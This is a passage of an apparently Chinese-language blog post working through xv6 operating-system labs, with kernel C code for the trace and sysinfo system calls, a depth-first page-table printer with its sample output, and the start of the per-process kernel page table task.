NOFILE; i++)<br>    <span class="hljs-keyword">if</span>(p-&gt;ofile[i])<br>      np-&gt;ofile[i] = filedup(p-&gt;ofile[i]);<br>  np-&gt;cwd = idup(p-&gt;cwd);<br><br>  safestrcpy(np-&gt;name, p-&gt;name, <span class="hljs-keyword">sizeof</span>(p-&gt;name));<br><br>  pid = np-&gt;pid;<br><br>  np-&gt;state = RUNNABLE;<br><br>  release(&amp;np-&gt;lock);<br><br>  np-&gt;mask=p-&gt;mask;<span class="hljs-comment">//给子进程的mask赋值</span><br><br>  <span class="hljs-keyword">return</span> pid;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>添加要索引到的系统调用名称数组</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">char</span>  *syscall_name[] = &#123;<br>  <span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;fork&quot;</span>, <span class="hljs-string">&quot;exit&quot;</span>, <span class="hljs-string">&quot;wait&quot;</span>, <span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;read&quot;</span>,<br>  <span class="hljs-string">&quot;kill&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;fstat&quot;</span>, <span class="hljs-string">&quot;chdir&quot;</span>, <span class="hljs-string">&quot;dup&quot;</span>, <span class="hljs-string">&quot;getpid&quot;</span>, <span class="hljs-string">&quot;sbrk&quot;</span>, <span class="hljs-string">&quot;sleep&quot;</span>,<br>  <span class="hljs-string">&quot;uptime&quot;</span>, <span class="hljs-string">&quot;open&quot;</span>, <span class="hljs-string">&quot;write&quot;</span>, <span class="hljs-string">&quot;mknod&quot;</span>, <span class="hljs-string">&quot;unlink&quot;</span>, <span class="hljs-string">&quot;link&quot;</span>, <span class="hljs-string">&quot;mkdir&quot;</span>,<span class="hljs-string">&quot;close&quot;</span>,<span class="hljs-string">&quot;trace&quot;</span>,<span class="hljs-string">&quot;sysinfo&quot;</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>修改 kernel/syscall.c 中的 syscall ()函数以打印跟踪输出</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">syscall</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> num;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span> =</span> myproc();<span class="hljs-comment">//myproc()：宏，当前的进程</span><br>  <span class="hljs-comment">// trap 代码将用户寄存器保存到当前进程的 trapframe 中</span><br>  num = p-&gt;trapframe-&gt;a7;<span class="hljs-comment">//num是系统调用号</span><br>  <span class="hljs-keyword">if</span>(num &gt; <span class="hljs-number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) &#123;<br>    p-&gt;trapframe-&gt;a0 = syscalls[num]();<span class="hljs-comment">//a0保存返回值</span><br>    <span class="hljs-keyword">if</span>((p-&gt;mask&gt;&gt;num)&amp;<span class="hljs-number">1</span>)<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d: syscall %s -&gt; %d\n&quot;</span>,p-&gt;pid,syscall_name[num],p-&gt;trapframe-&gt;a0);<span class="hljs-comment">//进程id、系统调用的名称、返回值</span><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %s: unknown sys call %d\n&quot;</span>,<br>            p-&gt;pid, p-&gt;name, num);<br>    p-&gt;trapframe-&gt;a0 = <span class="hljs-number">-1</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">$ trace 32 grep hello README</span><br><span class="hljs-comment">3: syscall read -&gt; 1023</span><br><span class="hljs-comment">3: syscall read -&gt; 966</span><br><span class="hljs-comment">3: syscall read -&gt; 70</span><br><span class="hljs-comment">3: syscall read -&gt; 0</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="Sysinfo"><a href="#Sysinfo" class="headerlink" title="Sysinfo"></a>Sysinfo</h2><p>In this assignment you will add a system call, <code>sysinfo</code>, that collects information about the running system. The system call takes one argument: a pointer to a <code>struct sysinfo</code> (see <code>kernel/sysinfo.h</code>). The kernel should fill out the fields of this struct: the <code>freemem</code> field should be set to the number of bytes of free memory, and the <code>nproc</code> field should be set to the number of processes whose <code>state</code> is not <code>UNUSED</code>. We provide a test program <code>sysinfotest</code>; you pass this assignment if it prints “sysinfotest: OK”.</p><p>任务：添加一个系统调用 sysinfo，它收集关于正在运行的系统的信息</p><ul><li>系统调用有一个参数: 一个指向 struct sysinfo 的指针(参见 kernel/sysinfo.h)</li><li>内核应该填充这个结构的字段:<ul><li>freemem 字段应该设置为可用内存的字节数</li><li>nproc 字段应该设置为状态不是 UNUSED 的进程数</li></ul></li></ul><p>Sysinfo 需要将一个 struct sysinfo 复制回用户空间; 请参阅 sys_fstat ()(kernel/sysfile.c)和 filestat()(kernel/file.c)以获得如何使用 copy out ()实现这一点的示例。</p><ul><li>添加$U/_sysinfotest</li><li>为了收集空闲内存量，向 kernel/kalloc.c 添加一个函数getFreeByte()</li></ul><p>这块重点是理解run、kmem结构体的实现，并知道访问资源的时候需要加锁。可以参考一下kalloc.c文件中别的函数的实现，很多地方直接套用就行</p><ul><li>kmem.freelist是空闲链表，当链表的next指针不为空时说明有一个空闲资源块，遍历次数就是页的数量</li><li>由于要求求出字节，因此需要<code>return PGSIZE*total;</code>（每页的字节数乘以total）</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getFreeByte</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">run</span> *<span class="hljs-title">p</span>;</span><br>  <span class="hljs-keyword">int</span> total=<span class="hljs-number">0</span>;<br><br>  acquire(&amp;kmem.lock);<span class="hljs-comment">//加锁</span><br>  p=kmem.freelist;<br>  <span class="hljs-keyword">while</span>(p)<br>  &#123;<br>    total++;<br>    p=p-&gt;next;<br>  &#125;<br>  release(&amp;kmem.lock);<br>  <span class="hljs-keyword">return</span> PGSIZE*total;<span class="hljs-comment">//每页的字节数*total</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>为了收集进程数，向 kernel/proc.c 添加一个函数getProcNum()</li></ul><p>proc.c中有一个全局变量proc[NPROC]，proc[0]是第一个进程，proc[NPROC-1]是最后一个进程，直接for循环遍历即可得到所有的进程结构体的指针，然后取出该指针的state字段和UNUSED比较即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> <span class="hljs-title">proc</span>[<span class="hljs-title">NPROC</span>];</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> &#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spinlock</span> <span class="hljs-title">lock</span>;</span><br><br>  <span class="hljs-comment">// p-&gt;lock must be held when using these:</span><br>  <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">procstate</span> <span class="hljs-title">state</span>;</span>        <span class="hljs-comment">// Process state</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">parent</span>;</span>         <span class="hljs-comment">// Parent process</span><br>  <span class="hljs-keyword">void</span> *chan;                  <span class="hljs-comment">// If non-zero, sleeping on chan</span><br>  <span class="hljs-keyword">int</span> killed;                  <span class="hljs-comment">// If non-zero, have been killed</span><br>  <span class="hljs-keyword">int</span> xstate;                  <span class="hljs-comment">// Exit status to be returned to parent&#x27;s wait</span><br>  <span class="hljs-keyword">int</span> pid;                     <span class="hljs-comment">// Process ID</span><br><br>  <span class="hljs-comment">// these are private to the process, so p-&gt;lock need not be held.</span><br>  uint64 kstack;               <span class="hljs-comment">// Virtual address of kernel stack</span><br>  uint64 sz;                   <span class="hljs-comment">// Size of process memory (bytes)</span><br>  <span class="hljs-keyword">pagetable_t</span> pagetable;       <span class="hljs-comment">// User page table</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">trapframe</span>;</span> <span class="hljs-comment">// data page for trampoline.S</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">context</span> <span class="hljs-title">context</span>;</span>      <span class="hljs-comment">// swtch() here to run process</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">ofile</span>[<span class="hljs-title">NOFILE</span>];</span>  <span class="hljs-comment">// Open files</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">cwd</span>;</span>           <span class="hljs-comment">// Current directory</span><br>  <span class="hljs-keyword">char</span> name[<span class="hljs-number">16</span>];               <span class="hljs-comment">// Process name (debugging)</span><br>  <span class="hljs-keyword">int</span> mask;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getProcNum</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> total=<span class="hljs-number">0</span>;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span>;</span><br><br>  <span class="hljs-keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) <br>  &#123;<br>    acquire(&amp;p-&gt;lock);<br>    <span class="hljs-keyword">if</span>(p-&gt;state!=UNUSED)<br>      total++;<br>    release(&amp;p-&gt;lock);<br>  &#125;<br>  <span class="hljs-keyword">return</span> total;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>在sysproc.c中添加函数sys_sysinfo(void)<ul><li>使用argaddr函数 从 trapframe 中以指针的形式检索第 n 个系统调用，关于argaddr函数的用法，在文件的别的函数处可以参考</li><li>声明一个sysinfo类型的结构体变量，然后使用之前写好的两个函数对它进行赋值</li><li>由于需要将一个sysinfo类型的结构体变量赋值回用户空间，因此需要使用copyout函数，注意这个函数的用法，比较难写对。一定要有<code>if(xxx) return -1 ;</code>的形式，不然的话会报错（在这里卡了很久）</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">uint64</span><br><span class="hljs-function"><span class="hljs-title">sys_sysinfo</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-comment">/*int sysinfo(struct sysinfo *)</span><br><span class="hljs-comment">  struct sysinfo &#123;</span><br><span class="hljs-comment">  uint64 freemem;   // amount of free memory (bytes)</span><br><span class="hljs-comment">  uint64 nproc;     // number of process</span><br><span class="hljs-comment">  &#125;;</span><br><span class="hljs-comment">  */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span>=</span>myproc();<br>  uint64 addr;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sysinfo</span> <span class="hljs-title">res</span>;</span><span class="hljs-comment">//注意这里不可以是指针，需要声明一个sysinfo类型的结构体变量</span><br><br>  <span class="hljs-keyword">if</span>(argaddr(<span class="hljs-number">0</span>, &amp;addr) &lt; <span class="hljs-number">0</span>)<span class="hljs-comment">//addr是指向sysinfo结构体的指针</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  <br>  res.freemem=getFreeByte();<br>  res.nproc=getProcNum();<br><br>  <span class="hljs-keyword">if</span>(copyout(p-&gt;pagetable, addr, (<span class="hljs-keyword">char</span>*)&amp;res, <span class="hljs-keyword">sizeof</span>(res))&lt;<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br><span class="hljs-comment">/* 如果这样写会失败</span><br><span class="hljs-comment">  copyout(p-&gt;pagetable, addr, (char*)&amp;res, sizeof(res));</span><br><span class="hljs-comment">*/</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>有一些头文件的添加，函数或者结构体的声明、定义的细节，暂且略过</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303212225098.png"></p><h1 id="Lab3-pgtable"><a href="#Lab3-pgtable" class="headerlink" title="Lab3 pgtable"></a>Lab3 pgtable</h1><p>写在lab开始之前：</p><ul><li><del>这个lab很明显和前面不是一个难度</del></li><li>需要补充一些虚拟内存的知识<ul><li>看一下配套的xv6指导手册</li><li>B站的课程视频录播</li></ul></li></ul><h2 id="页表"><a href="#页表" class="headerlink" title="页表"></a>页表</h2><p>虚拟地址中间的index有27位，因此页表项就有<code>2^27</code>个，也即是<code>0~2^27-1</code>，将index对应的PPN取出和offset拼在一起就成了PA（physical address）</p><p>xv6 运行在 Sv39 RISC-V 上，这意味着只使用 64 位虚拟地址的底部 39 位，顶部 25 位未被使用。因此下面图中只需要关注低39位</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202304171551847.png"></p><p>刚刚是单级页表，但是出于一些考虑，xv6使用三级页表的映射方式</p><p>Q：3级page table为什么会比一个超大的page table更好呢？</p><blockquote><p>Frans教授：这是个好问题，这的原因是，3级page table中，大量的PTE都可以不存储。比如，对于最高级的page table里面，如果一个PTE为空，那么你就完全不用创建它对应的中间级和最底层page table，以及里面的PTE。所以，这就是像是在整个虚拟地址空间中的一大段地址完全不需要有映射一样。</p><p>3级page table就像是按需分配这些映射块3级page table就像是按需分配这些映射块</p></blockquote><p>对于页表的每一项的内容，<code>0~63</code>位如下</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202304171551739.png"></p><p>xv6中定义的一些宏如下，和pte作<code>与</code>运算之后可以得到页表的某一位，比如pte &amp; PTE_V可以得知页表是否有效</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PTE_V (1L &lt;&lt; 0) <span class="hljs-comment">// valid 00001</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PTE_R (1L &lt;&lt; 1) <span class="hljs-comment">// readable 00010</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PTE_W (1L &lt;&lt; 2) <span class="hljs-comment">// writeable00100</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PTE_X (1L &lt;&lt; 3) <span class="hljs-comment">// executable01000</span></span><br></code></pre></td></tr></table></figure><p>PA2PTE(pa)将虚拟地址右移截断12位之后再左移10位，可以得到对应的页表项</p><p>PTE2PA(pte)将页表项右移截断10位之后再左移12位，可以得到对应的虚拟地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PA2PTE(pa) ((((uint64)pa) &gt;&gt; 12) &lt;&lt; 10)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PTE2PA(pte) (((pte) &gt;&gt; 10) &lt;&lt; 12)</span><br></code></pre></td></tr></table></figure><h2 id="Print-a-page-table"><a href="#Print-a-page-table" class="headerlink" title="Print a page table"></a>Print a page table</h2><p>在sh.c中加入代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Execute cmd.  Never returns.*</span><br>__attribute__((noreturn)) <br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">runcmd</span><span class="hljs-params">(struct cmd *cmd)</span> </span>&#123;<br>.....<br>&#125;<br></code></pre></td></tr></table></figure><p>这样做是为了防止报递归错</p><p>在exec.c中加入下面代码，以打印出进程1的页表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(p-&gt;pid==<span class="hljs-number">1</span>) <br>  vmprint(p-&gt;pagetable);<br><br><span class="hljs-keyword">return</span> argc; <span class="hljs-comment">// this ends up in a0, the first argument to main(argc, argv)</span><br><br></code></pre></td></tr></table></figure><p>在 kernel/defs.h 中定义 vmprint 的原型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// vm.c</span><br><span class="hljs-function"><span class="hljs-keyword">void</span>            <span class="hljs-title">vmprint</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span>            <span class="hljs-title">dfs_vmprint</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> ,<span class="hljs-keyword">int</span> )</span></span>;<br></code></pre></td></tr></table></figure><p>我们需要在vm.c中编写vmprint函数的代码</p><p>先观察一下给出的输出</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">page table 0x0000000087f6e000<br><span class="hljs-string">..0</span>: pte 0x0000000021fda801 pa 0x0000000087f6a000<br><span class="hljs-string">..</span> <span class="hljs-string">..0</span>: pte 0x0000000021fda401 pa 0x0000000087f69000<br><span class="hljs-string">..</span> <span class="hljs-string">..</span> <span class="hljs-string">..0</span>: pte 0x0000000021fdac1f pa 0x0000000087f6b000<br><span class="hljs-string">..</span> <span class="hljs-string">..</span> <span class="hljs-string">..1</span>: pte 0x0000000021fda00f pa 0x0000000087f68000<br><span class="hljs-string">..</span> <span class="hljs-string">..</span> <span class="hljs-string">..2</span>: pte 0x0000000021fd9c1f pa 0x0000000087f67000<br><span class="hljs-string">..255</span>: pte 0x0000000021fdb401 pa 0x0000000087f6d000<br><span class="hljs-string">..</span> <span class="hljs-string">..511</span>: pte 0x0000000021fdb001 pa 0x0000000087f6c000<br><span class="hljs-string">..</span> <span class="hljs-string">..</span> <span class="hljs-string">..510</span>: pte 0x0000000021fdd807 pa 0x0000000087f76000<br><span class="hljs-string">..</span> <span class="hljs-string">..</span> <span class="hljs-string">..511</span>: pte 0x0000000020001c0b pa 0x0000000080007000<br></code></pre></td></tr></table></figure><p>对该输出格式的几点解释：</p><ul><li>第一行格式是<code>page table %p</code>，%p是一级页表入口的地址，pagetable[i]就是一级页表第i项</li><li>第二行开始，是dfs的结果。从0到512进行循环，看pte是否有效，如果有效那么找到pte指向的下一个条目，直到找到叶子节点</li><li>顶级页表页面只有条目0和255的映射。条目0的下一个级别的页表只映射了索引0，而该索引0的底层则映射了条目0、1和2。顶级页表255同理</li></ul><p>先写出vmprint函数，把第一行打印出来，然后进入dfs循环</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> </span><br><span class="hljs-function"><span class="hljs-title">vmprint</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> pagetable)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;page table %p\n&quot;</span>, pagetable);<br>  dfs_vmprint(pagetable, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>pte &amp; PTE_V</code>用来判断页表是否有效，如果有效就先将对应的所有信息打印出来</p><p><code>pte &amp; (PTE_R|PTE_W|PTE_X)) == 0</code>用来判断是否有下一级的页表，如果有的话，就将该pte转化为虚拟地址，进入递归</p><p>写这部分代码要仔细参考阅读源码中的freewalk函数，很有帮助</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dfs_vmprint</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> pagetable,<span class="hljs-keyword">int</span> level)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// there are 2^9 = 512 PTEs in a page table.</span><br>  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">512</span>; i++)&#123;<br>    <span class="hljs-keyword">pte_t</span> pte = pagetable[i];<br>    <span class="hljs-keyword">if</span>((pte &amp; PTE_V))&#123;<span class="hljs-comment">//只要有效就打印出来</span><br>      <span class="hljs-comment">// this PTE points to a lower-level page table.</span><br>      <br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;..&quot;</span>);<span class="hljs-comment">//输出..的格式控制</span><br>      <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;level;j++) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; ..&quot;</span>);<br>      <br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d: pte %p pa %p\n&quot;</span>, i, pte, PTE2PA(pte));<span class="hljs-comment">//输出页表项信息</span><br>    <br>      <span class="hljs-keyword">if</span>((pte &amp; (PTE_R|PTE_W|PTE_X)) == <span class="hljs-number">0</span>)<span class="hljs-comment">//如果有下一级的页表</span><br>      &#123;<br>        uint64 child = PTE2PA(pte);<br>        dfs_vmprint((<span class="hljs-keyword">pagetable_t</span>)child, level+<span class="hljs-number">1</span>);<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> make qemu</span><br>qemu-system-riscv64 -machine virt -bios none -kernel kernel/kernel -m 128M -smp 3 -nographic -drive file=fs.img,if=none,format=raw,id=x0 -device virtio-blk-device,drive=x0,bus=virtio-mmio-bus.0<br><br>xv6 kernel is booting<br><br>hart 2 starting<br>hart 1 starting<br>page table 0x0000000087f6e000<br>..0: pte 0x0000000021fda801 pa 0x0000000087f6a000<br>.. ..0: pte 0x0000000021fda401 pa 0x0000000087f69000<br>.. .. ..0: pte 0x0000000021fdac1f pa 0x0000000087f6b000<br>.. .. ..1: pte 0x0000000021fda00f pa 0x0000000087f68000<br>.. .. ..2: pte 0x0000000021fd9c1f pa 0x0000000087f67000<br>..255: pte 0x0000000021fdb401 pa 0x0000000087f6d000<br>.. ..511: pte 0x0000000021fdb001 pa 0x0000000087f6c000<br>.. .. ..510: pte 0x0000000021fdd807 pa 0x0000000087f76000<br>.. .. ..511: pte 0x0000000020001c0b pa 0x0000000080007000<br>init: starting sh<br><span class="hljs-meta">$</span><span class="bash"> </span><br></code></pre></td></tr></table></figure><h2 id="A-kernel-page-table-per-process"><a href="#A-kernel-page-table-per-process" class="headerlink" title="A kernel page table per process"></a>A kernel page table per process</h2><p>Xv6只有一个内核页表，只要在内核中执行，就会使用它。内核页表是物理地址的直接映射，也即是内核虚拟地址 x 映射到物理地址 x。每个进程也会有自己的用户页表，该页表只包含此进程的用户空间的地址映射。而这些用户页表和用户地址在内核页表中是不存在的。因此就会出现一个问题：假设用户进程调用write系统调用并传递一个指针，由于该指针是用户级的地址，在内核中是无效的，因此实际过程中会先将用户级的虚拟地址转换为物理地址，这样就会造成一定程度的开销。本任务就是为了解决这个问题，让每个用户级的进程都有一个内核页表</p><p><strong>任务：修改内核，以便每个进程在内核中执行时使用其自己的内核页表副本</strong></p><p>我们自然想到要在 <code>struct proc</code>中加上进程的内核页表条目 kpgtable</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Per-process state</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> &#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spinlock</span> <span class="hljs-title">lock</span>;</span><br><br>  <span class="hljs-comment">// p-&gt;lock must be held when using these:</span><br>  <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">procstate</span> <span class="hljs-title">state</span>;</span>        <span class="hljs-comment">// Process state</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">parent</span>;</span>         <span class="hljs-comment">// Parent process</span><br>  <span class="hljs-keyword">void</span> *chan;                  <span class="hljs-comment">// If non-zero, sleeping on chan</span><br>  <span class="hljs-keyword">int</span> killed;                  <span class="hljs-comment">// If non-zero, have been killed</span><br>  <span class="hljs-keyword">int</span> xstate;                  <span class="hljs-comment">// Exit status to be returned to parent&#x27;s wait</span><br>  <span class="hljs-keyword">int</span> pid;                     